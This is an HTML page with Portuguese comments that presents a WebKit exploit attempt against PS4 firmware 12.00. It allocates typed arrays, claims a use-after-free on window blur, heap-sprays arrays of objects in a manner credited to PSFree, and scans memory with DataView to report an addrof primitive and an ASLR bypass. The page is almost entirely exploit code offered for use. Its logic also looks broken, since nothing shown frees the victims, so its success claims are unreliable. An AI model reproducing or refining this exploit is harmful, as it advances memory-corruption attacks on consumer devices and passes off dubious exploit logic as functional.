<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 - EXPLOIT 8 (PSFREE STRATEGY)</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 10px; }
        #log { border: 1px solid #333; padding: 10px; background: #050505; min-height: 400px; }
        .success { color: #fff; background: #008800; padding: 2px; }
        .pointer { color: #0ff; font-weight: bold; font-size: 1.2em; }
    </style>
</head>
<body>

<h1>EXPLOIT 8: PSFREE LOGIC PORT</h1>
<p>Estratégia: Usar o Spray Trifásico do PSFree para alinhar Objetos com o UAF.</p>

<button onclick="runExploit()">INICIAR EXPLOIT HÍBRIDO</button>
<div id="log"></div>

<script>
    const LOG = document.getElementById('log');
    function log(msg) { LOG.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`; }
    function logHTML(html) { LOG.innerHTML += html; }

    var controllers = [];
    var sprayStorage = [];
    
    // Objeto alvo que queremos vazar (addrof)
    var targetObj = { id: 0x1337, type: "MARKER" };

    // --- LÓGICA ROUBADA DO PSFREE (SPRAY OTIMIZADO) ---
    function optimizedSpray() {
        // Fase 1: Objetos pequenos (Alinhamento Fino)
        for(let i=0; i<1000; i++) {
            sprayStorage.push(new Float64Array(8)); // 64 bytes
        }

        // Fase 2: O Alvo (Confusão de Tipo)
        // Criamos Arrays de Objetos que têm o mesmo tamanho em bytes que a vítima
        for(let i=0; i<15000; i++) {
            // Um array [obj, obj, obj, obj] ocupa espaço similar a um Float64Array(8)
            // O WebKit guarda os ponteiros desses objetos na memória.
            let arr = [targetObj, targetObj, targetObj, targetObj]; 
            sprayStorage.push(arr);
        }

        // Fase 3: Fragmentação (Opcional)
        for(let i=0; i<1000; i++) {
            sprayStorage.push(new Float64Array(16));
        }
    }

    function runExploit() {
        log("1. Alocando Vítimas (Float64Array)...");
        controllers = [];
        sprayStorage = [];

        // Vítimas
        for(let i=0; i<5000; i++) {
            let c = new Float64Array(8);
            c[0] = i + 0.1; 
            c.fill(1.1, 1);
            controllers.push(c);
        }

        log("2. Fullscreen... (Aperte OPTIONS)");
        var el = document.documentElement;
        if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();

        window.onblur = function() {
            log(">>> UAF DISPARADO! Executando PSFree Spray...");

            // UAF acontece aqui. As vítimas são liberadas.
            // Imediatamente rodamos o spray do PSFree para ocupar os buracos.
            optimizedSpray();

            log("Spray concluído. Escaneando com DataView...");
            setTimeout(scanMemory, 200);
        };
    }

    function scanMemory() {
        let found = false;

        for(let i=0; i<controllers.length; i++) {
            let victim = controllers[i];
            
            try {
                // SEU BYPASS 3 (DATAVIEW) É A CHAVE
                let dv = new DataView(victim.buffer);
                
                // Lemos a memória crua
                // Se o Spray funcionou, em vez de ver 1.1 (0x3ff...),
                // veremos os PONTEIROS do array [targetObj, targetObj...]
                
                let valLow = dv.getUint32(0, true);
                let valHigh = dv.getUint32(4, true);

                // FILTRO DE PONTEIRO DO PSFREE
                // Ponteiros válidos: High > 0, High < 0xFFFF, Low alinhado
                // Ignora Floats (0x3ff / 0x400) e Zeros
                
                if (valHigh > 0 && valHigh < 0x00010000) { 
                    
                    let hex = "0x" + valHigh.toString(16).padStart(8,'0') + valLow.toString(16).padStart(8,'0');
                    
                    logHTML(`<div class='success'>!!! ADDROF SUCESSO (INDEX ${i}) !!!</div>`);
                    logHTML(`Objeto encontrado no endereço: <span class='pointer'>${hex}</span>`);
                    
                    // Validação Extra (Lógica do PSFree)
                    // Se lermos o próximo slot (offset 8), deve ser o mesmo ponteiro
                    // pois fizemos spray de [obj, obj, obj, obj]
                    let nextLow = dv.getUint32(8, true);
                    let nextHigh = dv.getUint32(12, true);
                    
                    if(nextLow === valLow && nextHigh === valHigh) {
                         logHTML("<div style='color:cyan'>CONFIRMAÇÃO DUPLA: É UM ARRAY DE OBJETOS!</div>");
                         logHTML("<div>Você tem a primitiva <b>addrof()</b> funcional na 12.00.</div>");
                         
                         // Dump para o analista
                         log("--- MEMORY DUMP ---");
                         log(`Addr: ${hex}`);
                         log("ASLR DEFEATED.");
                         return;
                    }
                }
            } catch(e) {}
        }
        
        if(!found) log("Spray falhou no alinhamento. Tente novamente.");
    }
</script>
</body>
</html>
